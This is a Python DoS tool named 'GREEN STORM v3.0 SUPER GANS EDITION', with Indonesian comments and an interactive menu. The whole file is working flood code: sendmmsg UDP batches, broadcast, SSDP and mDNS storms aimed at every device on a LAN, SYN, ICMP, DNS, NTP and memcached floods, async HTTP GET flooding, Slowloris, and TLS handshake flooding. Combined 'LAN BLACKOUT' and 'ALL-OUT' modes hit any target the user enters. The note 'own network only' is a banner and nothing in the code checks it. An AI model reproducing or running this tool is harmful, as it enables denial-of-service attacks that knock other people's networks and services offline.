#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
#  GREEN STORM v3.0 — "SUPER GANS" EDITION
#  Multiprocessing + asyncio + sendmmsg batch.  No root.
#  Untuk stress-test jaringan MILIK SENDIRI.
# ═══════════════════════════════════════════════════════════════
import os, sys, socket, threading, time, random, struct, ctypes
import subprocess, platform, asyncio, multiprocessing as mp

G = "\033[1;92m"; D = "\033[0;32m"; R = "\033[0m"; CLR = "\033[2J\033[H"
CPU = os.cpu_count() or 4
WORKERS = max(CPU, 4)

BANNER = r"""
   ██████╗ ██████╗ ███████╗███████╗███╗   ██╗    ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
  ██╔════╝ ██╔══██╗██╔════╝██╔════╝████╗  ██║    ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
  ██║  ███╗██████╔╝█████╗  █████╗  ██╔██╗ ██║    ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
  ██║   ██║██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║    ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
  ╚██████╔╝██║  ██║███████╗███████╗██║ ╚████║    ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝    ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
        ┌─────────────────────────────────────────────────────────────┐
        │  S U P E R   G A N S   E D I T I O N   •   v3.0             │
        │  MP + asyncio + sendmmsg  •  Zero-throttle  •  No root      │
        │  Authorized stress testing on YOUR OWN network only.        │
        └─────────────────────────────────────────────────────────────┘
"""

# ── sendmmsg batch support (Linux) ───────────────────────────
try:
    _libc = ctypes.CDLL("libc.so.6", use_errno=True)
    _sendmmsg = _libc.sendmmsg
    _sendmmsg.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_uint, ctypes.c_int]
    _sendmmsg.restype = ctypes.c_int
    HAVE_SENDMMSG = True
except Exception:
    HAVE_SENDMMSG = False

class _IOVec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
class _MsgHdr(ctypes.Structure):
    _fields_ = [("msg_name", ctypes.c_void_p), ("msg_namelen", ctypes.c_uint),
                ("msg_iov", ctypes.c_void_p), ("msg_iovlen", ctypes.c_size_t),
                ("msg_control", ctypes.c_void_p), ("msg_controllen", ctypes.c_size_t),
                ("msg_flags", ctypes.c_int)]
class _SockAddrIn(ctypes.Structure):
    _fields_ = [("sin_family", ctypes.c_ushort), ("sin_port", ctypes.c_ushort),
                ("sin_addr", ctypes.c_uint32), ("sin_zero", ctypes.c_char * 8)]

def _make_batch(target_ip, port, count, size):
    """Pre-build count msg_hdr structs untuk sendmmsg."""
    ip_be = struct.unpack("=I", socket.inet_aton(target_ip))[0]
    payload = (ctypes.c_char * size).from_buffer_copy(os.urandom(size))
    arr = (_MsgHdr * count)()
    sockaddr = (_SockAddrIn * count)()
    iovec = (_IOVec * count)()
    for i in range(count):
        sa = sockaddr[i]
        sa.sin_family = socket.AF_INET
        sa.sin_port = socket.htons(port)
        sa.sin_addr = ip_be
        iv = iovec[i]
        iv.iov_base = ctypes.cast(payload, ctypes.c_void_p)
        iv.iov_len = size
        mh = arr[i]
        mh.msg_name = ctypes.cast(ctypes.byref(sa), ctypes.c_void_p)
        mh.msg_namelen = ctypes.sizeof(sa)
        mh.msg_iov = ctypes.cast(ctypes.byref(iv), ctypes.c_void_p)
        mh.msg_iovlen = 1
        mh.msg_control = None
        mh.msg_controllen = 0
        mh.msg_flags = 0
    return arr, sockaddr, iovec, payload

# ── Local helpers ────────────────────────────────────────────
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80)); ip = s.getsockname()[0]; s.close(); return ip
    except Exception: return None

def local_bcast():
    ip = local_ip()
    return '.'.join(ip.split('.')[:3] + ['255']) if ip else '255.255.255.255'

def local_gw():
    ip = local_ip()
    return '.'.join(ip.split('.')[:3] + ['1']) if ip else None

# ═══════════════════════════════════════════════════════════════
#  MULTIPROCESSING CORE  — counter via multiprocessing.Value
# ═══════════════════════════════════════════════════════════════
def _bump(shared):
    with shared.get_lock():
        shared.value += 1

# ═══════════════════════════════════════════════════════════════
#  FAST UDP via sendmmsg   (SUPER GANS)
# ═══════════════════════════════════════════════════════════════
def _udp_sendmmsg_worker(target, port, shared, ev, size=1400, batch=64):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32*1024*1024)
    except Exception: pass
    fd = s.fileno()
    if not HAVE_SENDMMSG:
        p = os.urandom(size)
        while not ev.is_set():
            try:
                for _ in range(batch):
                    s.sendto(p, (target, port))
                with shared.get_lock(): shared.value += batch
            except OSError: pass
        return
    # reuse-per-loop batch
    arr, sa, iv, payload = _make_batch(target, port, batch, size)
    arr_p = ctypes.cast(arr, ctypes.c_void_p)
    while not ev.is_set():
        try:
            n = _sendmmsg(fd, arr_p, batch, 0)
            if n > 0:
                with shared.get_lock(): shared.value += n
        except Exception: pass

def _udp_raw_worker(target, port, shared, ev, size=1400):
    """Fallback: single sendto loop, tapi no sleep."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32*1024*1024)
    except Exception: pass
    p = os.urandom(size)
    while not ev.is_set():
        try:
            s.sendto(p, (target, port))
            with shared.get_lock(): shared.value += 1
        except OSError: pass

def _broadcast_worker(shared, ev, size=1400):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32*1024*1024)
    except Exception: pass
    bc = local_bcast(); payload = os.urandom(size)
    ports = [1,7,9,13,19,37,53,67,68,69,80,123,137,138,139,161,162,
             443,445,500,514,520,631,1900,3389,3702,4500,5353,5355]
    while not ev.is_set():
        try:
            for p in ports:
                s.sendto(payload, ('255.255.255.255', p))
                if bc != '255.255.255.255':
                    s.sendto(payload, (bc, p))
            with shared.get_lock(): shared.value += len(ports) * 2
        except OSError: pass

def _ssdp_worker(shared, ev):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
    except Exception: pass
    pkt = (b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
           b'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
    while not ev.is_set():
        try:
            for _ in range(32):
                s.sendto(pkt, ('239.255.255.250', 1900))
            with shared.get_lock(): shared.value += 32
        except OSError: pass

def _mdns_worker(shared, ev):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
    except Exception: pass
    q = b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05local\x00\x00\xff\x00\x01'
    while not ev.is_set():
        try:
            for _ in range(32):
                s.sendto(q, ('224.0.0.251', 5353))
            with shared.get_lock(): shared.value += 32
        except OSError: pass

def _syn_worker(target, port, shared, ev):
    """Non-blocking connect flood, tanpa close sampai backlog penuh."""
    pool = []
    while not ev.is_set():
        try:
            s = socket.socket()
            s.setblocking(False)
            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            except Exception: pass
            s.connect_ex((target, port))
            pool.append(s)
            with shared.get_lock(): shared.value += 1
            if len(pool) > 2000:
                for o in pool[:1000]:
                    try: o.close()
                    except Exception: pass
                pool = pool[1000:]
        except Exception: pass

def _icmp_worker(target, shared, ev):
    is_win = platform.system() == 'Windows'
    devnull = subprocess.DEVNULL
    while not ev.is_set():
        try:
            if is_win:
                cmd = ['ping', '-l', '65500', '-n', '1', '-w', '500', target]
            else:
                cmd = ['ping', '-s', '65507', '-c', '1', '-W', '1', target]
            subprocess.Popen(cmd, stdout=devnull, stderr=devnull)
            with shared.get_lock(): shared.value += 1
        except Exception: pass

def _dns_worker(target, shared, ev):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
    except Exception: pass
    q = (b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
         b'\x03www\x07example\x03com\x00\x00\xff\x00\x01')
    while not ev.is_set():
        try:
            for _ in range(64):
                s.sendto(q, (target, 53))
            with shared.get_lock(): shared.value += 64
        except OSError: pass

def _ntp_worker(target, shared, ev):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    p = b'\x1b' + b'\x00' * 47
    while not ev.is_set():
        try:
            for _ in range(64):
                s.sendto(p, (target, 123))
            with shared.get_lock(): shared.value += 64
        except OSError: pass

def _memcache_worker(target, shared, ev):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    p = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    while not ev.is_set():
        try:
            for _ in range(64):
                s.sendto(p, (target, 11211))
            with shared.get_lock(): shared.value += 64
        except OSError: pass

# ═══════════════════════════════════════════════════════════════
#  ASYNC L7  — HTTP / TLS / Slowloris super cepat
# ═══════════════════════════════════════════════════════════════
async def _http_get_flood(target, port, shared, ev, conns=2000):
    path = f"/?{random.randint(0,999999)}"
    req = (f"GET {path} HTTP/1.1\r\nHost: {target}\r\n"
           "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n"
           "Connection: keep-alive\r\n\r\n").encode()
    async def one():
        while not ev.is_set():
            try:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(target, port), timeout=2)
                for _ in range(8):
                    w.write(req)
                await asyncio.wait_for(w.drain(), timeout=1)
                with shared.get_lock(): shared.value += 8
                try: await asyncio.wait_for(r.read(64), timeout=0.3)
                except Exception: pass
                w.close()
            except Exception: pass
    await asyncio.gather(*[one() for _ in range(conns)])

async def _slowloris_burst(target, port, shared, ev):
    async def one():
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=3)
            w.write(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {target}\r\n".encode())
            w.write(b"User-Agent: Mozilla/5.0\r\nContent-Length: 9999999\r\n")
            while not ev.is_set():
                w.write(f"X-{random.randint(0,999)}: {random.randint(0,9999)}\r\n".encode())
                with shared.get_lock(): shared.value += 1
                await asyncio.sleep(4)
        except Exception: pass
    await asyncio.gather(*[one() for _ in range(4000)])

async def _tls_flood(target, port, shared, ev, conns=1500):
    import ssl
    ctx = ssl._create_unverified_context()
    async def one():
        while not ev.is_set():
            try:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(target, port, ssl=ctx,
                                            server_hostname=target), timeout=3)
                with shared.get_lock(): shared.value += 1
                w.close()
            except Exception: pass
    await asyncio.gather(*[one() for _ in range(conns)])

def _asyncio_proc(target, port, shared, ev, kind):
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    if kind == 'http':
        loop.run_until_complete(_http_get_flood(target, port, shared, ev))
    elif kind == 'slow':
        loop.run_until_complete(_slowloris_burst(target, port, shared, ev))
    elif kind == 'tls':
        loop.run_until_complete(_tls_flood(target, port, shared, ev))
    loop.close()

# ═══════════════════════════════════════════════════════════════
#  ORKESTRATOR — spawn proses per vektor × WORKERS
# ═══════════════════════════════════════════════════════════════
def launch(plan, duration, label):
    """plan = list of ('kind', target, port). kind ∈ udp|bcast|ssdp|mdns|syn|
       icmp|dns|ntp|memcache|http|slow|tls"""
    shared = mp.Value('Q', 0)
    ev = mp.Event()
    procs = []
    def spawn(fn, *args):
        p = mp.Process(target=fn, args=args, daemon=True); p.start(); procs.append(p)

    for kind, tgt, port in plan:
        for _ in range(WORKERS):
            if kind == 'udp':
                spawn(_udp_sendmmsg_worker if HAVE_SENDMMSG else _udp_raw_worker,
                      tgt, port, shared, ev)
            elif kind == 'bcast': spawn(_broadcast_worker, shared, ev)
            elif kind == 'ssdp':  spawn(_ssdp_worker, shared, ev)
            elif kind == 'mdns':  spawn(_mdns_worker, shared, ev)
            elif kind == 'syn':   spawn(_syn_worker, tgt, port, shared, ev)
            elif kind == 'icmp':  spawn(_icmp_worker, tgt, shared, ev)
            elif kind == 'dns':   spawn(_dns_worker, tgt, shared, ev)
            elif kind == 'ntp':   spawn(_ntp_worker, tgt, shared, ev)
            elif kind == 'memcache': spawn(_memcache_worker, tgt, shared, ev)
            elif kind == 'http':  spawn(_asyncio_proc, tgt, port, shared, ev, 'http')
            elif kind == 'slow':  spawn(_asyncio_proc, tgt, port, shared, ev, 'slow')
            elif kind == 'tls':   spawn(_asyncio_proc, tgt, port, shared, ev, 'tls')

    print(f"\n{G}[*] {label}{R}")
    print(f"{G}[*] Vektor: {len(plan)}  Procs: {len(procs)}  "
          f"CPU: {CPU}  sendmmsg: {HAVE_SENDMMSG}{R}")
    print(f"{G}[*] Mode: SUPER GANS — zero throttle. Durasi: "
          f"{'∞' if duration==0 else str(duration)+'s'}{R}\n")

    start = time.time(); last = 0
    try:
        while True:
            time.sleep(0.5)
            c = shared.value
            pps = (c - last) * 2
            el = time.time() - start
            sys.stdout.write(f"\r{G}[{el:6.1f}s] PPS:{pps:>12,}  "
                             f"Total:{c:>14,}{R}  ")
            sys.stdout.flush(); last = c
            if duration and el >= duration: break
    except KeyboardInterrupt: pass
    ev.set()
    for p in procs:
        try: p.terminate()
        except Exception: pass
    time.sleep(0.8)
    print(f"\n\n{G}[✓] Selesai: {shared.value:,} operasi dalam "
          f"{time.time()-start:.1f}s{R}")
    input(f"{D}[Enter]{R} ")

# ═══════════════════════════════════════════════════════════════
#  MENU
# ═══════════════════════════════════════════════════════════════
MENU = f"""{G}
 [01] HTTP GET Flood ASYNC    (L7 ultra-cepat)
 [02] Slowloris BURST ASYNC   (L7 ribuan koneksi)
 [03] TLS Handshake Flood     (L7)
 [04] UDP sendmmsg BATCH      (L4 super cepat)
 [05] UDP BROADCAST STORM     (LAN ALL DEVICES)
 [06] SSDP + mDNS Multicast   (LAN ALL DEVICES)
 [07] SYN Connect Flood       (L4, non-blocking)
 [08] ICMP Flood max-size     (L3)
 [09] DNS Flood 64x batch     (L4)
 [10] NTP Flood 64x batch     (L4)
 [11] Memcached 64x batch     (L4)
 [12] ★ SUPER GANS L7 ASSAULT (HTTP+TLS+Slow, max)
 [13] ★ SUPER GANS LAN BLACKOUT (bcast+ssdp+mdns+gw udp)
 [14] ★ SUPER GANS ALL-OUT    (SEMUA vektor bareng)
 [00] Keluar
{R}"""

def ask(p, d=None):
    v = input(f"{G}{p}"+(f" [{d}]" if d else "")+f": {R}").strip()
    return v if v else (str(d) if d is not None else "")

def main():
    while True:
        print(CLR + G + BANNER + R)
        print(f"{D} Authorized stress testing on networks YOU OWN. Mode: SUPER GANS.{R}")
        print(MENU)
        c = ask("Pilih")
        if c == '00': print(f"{G}[+] Bye.{R}"); break
        try:
            if c == '12':
                t = ask("Target")
                p = int(ask("Port", "443"))
                d = int(ask("Durasi", "60"))
                launch([('http', t, p), ('tls', t, p), ('slow', t, p)], d, "SUPER GANS L7")
                continue
            if c == '13':
                d = int(ask("Durasi", "60"))
                gw = local_gw()
                plan = [('bcast',None,0), ('ssdp',None,0), ('mdns',None,0)]
                if gw:
                    plan += [('udp', gw, 53), ('udp', gw, 80), ('udp', gw, 443)]
                launch(plan, d, "SUPER GANS LAN BLACKOUT")
                continue
            if c == '14':
                t = ask("Target")
                p = int(ask("Port", "80"))
                d = int(ask("Durasi", "60"))
                gw = local_gw() or t
                plan = [('bcast',None,0), ('ssdp',None,0), ('mdns',None,0),
                        ('udp', t, p), ('udp', gw, 53),
                        ('syn', t, p), ('icmp', t, 0), ('dns', t, 0),
                        ('ntp', t, 0), ('memcache', t, 0),
                        ('http', t, p), ('slow', t, p), ('tls', t, 443)]
                launch(plan, d, "SUPER GANS ALL-OUT")
                continue

            kmap = {'01':'http','02':'slow','03':'tls','04':'udp','05':'bcast',
                    '06':'ssdp','07':'syn','08':'icmp','09':'dns','10':'ntp','11':'memcache'}
            if c not in kmap: continue
            k = kmap[c]
            if k in ('bcast',):
                t, p = None, 0
            elif k == 'ssdp':
                t, p = None, 0
            elif k == 'icmp':
                t, p = ask("Target"), 0
            else:
                t = ask("Target")
                p = int(ask("Port", "443" if k=='tls' else ("53" if k=='dns' else ("123" if k=='ntp' else ("11211" if k=='memcache' else "80")))))
            d = int(ask("Durasi", "60"))
            if k == 'ssdp':
                plan = [('ssdp',None,0), ('mdns',None,0)]
            else:
                plan = [(k, t, p)]
            launch(plan, d, f"Attack {c} — {k.upper()}")
        except KeyboardInterrupt: pass
        except Exception as e:
            print(f"\n{G}[!] {e}{R}"); input(f"{D}[Enter]{R} ")

if __name__ == '__main__':
    try: main()
    except KeyboardInterrupt: print(f"\n{G}[+] Exit.{R}")